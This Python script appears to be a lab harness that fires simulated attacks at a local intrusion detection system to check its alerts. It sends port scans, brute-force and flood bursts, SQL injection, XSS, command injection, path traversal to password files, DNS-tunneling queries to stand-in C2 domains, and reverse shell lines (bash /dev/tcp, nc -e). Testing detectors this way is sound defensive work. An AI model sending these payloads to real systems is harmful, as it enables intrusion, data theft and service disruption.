#!/usr/bin/env python3
"""
ShadowFence Attack Simulation Lab
===================================
Simulates various network attacks against ShadowFence IDS
to demonstrate detection capabilities.

Author: Sudeep Patil | Network Security Engineer
"""

import socket
import struct
import sys
import time

TARGET = "127.0.0.1"


def banner(text):
    print(f"\n{'='*60}")
    print(f"  ATTACK SIMULATION: {text}")
    print(f"{'='*60}\n")


def simulate_port_scan():
    """Simulate a TCP SYN port scan across multiple ports."""
    banner("PORT SCAN (20 ports)")
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
             143, 443, 445, 993, 995, 3306, 3389, 5432, 8080, 8443]

    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((TARGET, port))
            status = "open" if s.connect_ex((TARGET, port)) == 0 else "closed"
            print(f"  [SCAN] Port {port}: {status}")
            s.close()
        except Exception:
            pass
        time.sleep(0.05)

    print("  [DONE] Port scan complete - ShadowFence should detect this!")
    time.sleep(1)


def simulate_brute_force_ssh():
    """Simulate SSH brute force by rapidly connecting to port 22."""
    banner("SSH BRUTE FORCE (15 rapid connections)")

    for i in range(15):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect_ex((TARGET, 22))
            s.send(b"SSH-2.0-attacker\r\n")
            s.close()
            print(f"  [BRUTE] Attempt {i+1}/15 to SSH port 22")
        except Exception:
            pass
        time.sleep(0.05)

    print("  [DONE] Brute force simulation complete!")
    time.sleep(1)


def simulate_brute_force_rdp():
    """Simulate RDP brute force."""
    banner("RDP BRUTE FORCE (12 rapid connections)")

    for i in range(12):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect_ex((TARGET, 3389))
            s.close()
            print(f"  [BRUTE] Attempt {i+1}/12 to RDP port 3389")
        except Exception:
            pass
        time.sleep(0.05)

    print("  [DONE] RDP brute force simulation complete!")
    time.sleep(1)


def simulate_syn_flood():
    """Simulate SYN flood using rapid TCP connections."""
    banner("SYN FLOOD (200 rapid SYN packets)")

    for i in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect_ex((TARGET, 80))
            s.close()
        except Exception:
            pass

        if (i + 1) % 50 == 0:
            print(f"  [FLOOD] Sent {i+1}/200 SYN packets to port 80")

    print("  [DONE] SYN flood simulation complete!")
    time.sleep(1)


def simulate_http_flood():
    """Simulate HTTP flood with rapid requests."""
    banner("HTTP FLOOD (50 rapid HTTP requests)")

    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect_ex((TARGET, 80))
            request = (
                b"GET / HTTP/1.1\r\n"
                b"Host: target.local\r\n"
                b"User-Agent: FloodBot/1.0\r\n\r\n"
            )
            s.send(request)
            s.close()
        except Exception:
            pass

        if (i + 1) % 10 == 0:
            print(f"  [HTTP] Sent {i+1}/50 HTTP flood requests")

    print("  [DONE] HTTP flood simulation complete!")
    time.sleep(1)


def simulate_sql_injection():
    """Simulate SQL injection payloads in HTTP requests."""
    banner("SQL INJECTION PAYLOADS")

    payloads = [
        b"GET /login?user=admin' OR '1'='1'-- HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /search?q='; DROP TABLE users;-- HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /api HTTP/1.1\r\nHost: target\r\n\r\nusername=admin' UNION SELECT * FROM passwords--",
        b"GET /page?id=1; SELECT * FROM information_schema.tables HTTP/1.1\r\nHost: target\r\n\r\n",
    ]

    for i, payload in enumerate(payloads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((TARGET, 80))
            s.send(payload)
            s.close()
            print(f"  [SQLi] Sent payload {i+1}/4: {payload[:60]}...")
        except Exception:
            pass
        time.sleep(0.2)

    print("  [DONE] SQL injection simulation complete!")
    time.sleep(1)


def simulate_xss():
    """Simulate XSS attack payloads."""
    banner("XSS ATTACK PAYLOADS")

    payloads = [
        b"GET /search?q=<script>alert('xss')</script> HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /page?name=<img src=x onerror=alert(1)> HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /comment HTTP/1.1\r\nHost: target\r\n\r\nbody=<script>document.cookie</script>",
    ]

    for i, payload in enumerate(payloads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((TARGET, 80))
            s.send(payload)
            s.close()
            print(f"  [XSS] Sent payload {i+1}/3")
        except Exception:
            pass
        time.sleep(0.2)

    print("  [DONE] XSS simulation complete!")
    time.sleep(1)


def simulate_command_injection():
    """Simulate command injection payloads."""
    banner("COMMAND INJECTION PAYLOADS")

    payloads = [
        b"GET /api?cmd=;cat /etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /exec?input=|ls -la /tmp HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /run HTTP/1.1\r\nHost: target\r\n\r\ncmd=`whoami`",
    ]

    for i, payload in enumerate(payloads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((TARGET, 80))
            s.send(payload)
            s.close()
            print(f"  [CMD] Sent payload {i+1}/3")
        except Exception:
            pass
        time.sleep(0.2)

    print("  [DONE] Command injection simulation complete!")
    time.sleep(1)


def simulate_directory_traversal():
    """Simulate directory traversal attack."""
    banner("DIRECTORY TRAVERSAL")

    payloads = [
        b"GET /file?path=../../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /download?file=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1\r\nHost: target\r\n\r\n",
    ]

    for i, payload in enumerate(payloads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((TARGET, 80))
            s.send(payload)
            s.close()
            print(f"  [TRAV] Sent payload {i+1}/2")
        except Exception:
            pass
        time.sleep(0.2)

    print("  [DONE] Directory traversal simulation complete!")
    time.sleep(1)


def simulate_dns_tunneling():
    """Simulate DNS tunneling with long suspicious queries."""
    banner("DNS TUNNELING (suspicious DNS queries)")

    suspicious_domains = [
        "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.data.evil-c2.com",
        "dGhpcyBpcyBhIGxvbmcgZW5jb2RlZCBwYXlsb2Fk.exfil.malware.net",
        "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo.tunnel.attack.org",
        "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3.c2.backdoor.io",
    ]

    for i, domain in enumerate(suspicious_domains):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.3)
            # Build a basic DNS query packet
            query = build_dns_query(domain)
            s.sendto(query, (TARGET, 53))
            s.close()
            print(f"  [DNS] Tunneling query {i+1}/4: {domain[:50]}...")
        except Exception:
            pass
        time.sleep(0.3)

    print("  [DONE] DNS tunneling simulation complete!")
    time.sleep(1)


def build_dns_query(domain):
    """Build a raw DNS query packet."""
    transaction_id = b'\xaa\xbb'
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answers = b'\x00\x00'
    authority = b'\x00\x00'
    additional = b'\x00\x00'

    header = transaction_id + flags + questions + answers + authority + additional

    qname = b''
    for part in domain.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'

    qtype = b'\x00\x01'   # A record
    qclass = b'\x00\x01'  # IN class

    return header + qname + qtype + qclass


def simulate_nmap_scan():
    """Simulate Nmap scanner user-agent detection."""
    banner("NMAP SCANNER DETECTION")

    payloads = [
        b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)\r\n\r\n",
        b"GET /robots.txt HTTP/1.1\r\nHost: target\r\nUser-Agent: Nikto/2.1.6\r\n\r\n",
    ]

    for i, payload in enumerate(payloads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((TARGET, 80))
            s.send(payload)
            s.close()
            print(f"  [SCAN] Scanner payload {i+1}/2 sent")
        except Exception:
            pass
        time.sleep(0.2)

    print("  [DONE] Scanner detection simulation complete!")
    time.sleep(1)


def simulate_reverse_shell():
    """Simulate reverse shell payload detection."""
    banner("REVERSE SHELL PAYLOAD")

    payloads = [
        b"GET /exec HTTP/1.1\r\nHost: target\r\n\r\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        b"POST /api HTTP/1.1\r\nHost: target\r\n\r\nnc -e /bin/sh 10.0.0.1 4444",
    ]

    for i, payload in enumerate(payloads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((TARGET, 80))
            s.send(payload)
            s.close()
            print(f"  [SHELL] Reverse shell payload {i+1}/2 sent")
        except Exception:
            pass
        time.sleep(0.2)

    print("  [DONE] Reverse shell simulation complete!")
    time.sleep(1)


def simulate_multi_service_scan():
    """Scan database and other service ports."""
    banner("DATABASE & SERVICE PORT SCAN")

    services = {
        3306: "MySQL",
        5432: "PostgreSQL",
        1433: "MSSQL",
        27017: "MongoDB",
        6379: "Redis",
        5900: "VNC",
        11211: "Memcached",
        9200: "Elasticsearch",
    }

    for port, name in services.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            result = s.connect_ex((TARGET, port))
            status = "open" if result == 0 else "closed"
            print(f"  [DB] {name} (port {port}): {status}")
            s.close()
        except Exception:
            pass
        time.sleep(0.05)

    print("  [DONE] Service scan complete!")
    time.sleep(1)


def main():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ShadowFence Virtual Attack Lab                      ║
    ║   ──────────────────────────────                      ║
    ║   Simulating 12 attack types against the IDS          ║
    ║   Author: Sudeep Patil | Network Security Engineer    ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """)

    attacks = [
        ("Port Scan", simulate_port_scan),
        ("SSH Brute Force", simulate_brute_force_ssh),
        ("RDP Brute Force", simulate_brute_force_rdp),
        ("SYN Flood", simulate_syn_flood),
        ("HTTP Flood", simulate_http_flood),
        ("SQL Injection", simulate_sql_injection),
        ("XSS Attack", simulate_xss),
        ("Command Injection", simulate_command_injection),
        ("Directory Traversal", simulate_directory_traversal),
        ("Nmap/Nikto Scanner", simulate_nmap_scan),
        ("Reverse Shell", simulate_reverse_shell),
        ("Database Service Scan", simulate_multi_service_scan),
    ]

    print(f"\n  Running {len(attacks)} attack simulations...\n")

    for i, (name, func) in enumerate(attacks):
        print(f"\n  >>> Attack {i+1}/{len(attacks)}: {name}")
        func()

    print(f"""
    {'='*60}
      ALL ATTACK SIMULATIONS COMPLETE!
      
      Check the ShadowFence dashboard at http://localhost:8443
      to see all detected threats and alerts.
    {'='*60}
    """)


if __name__ == "__main__":
    main()
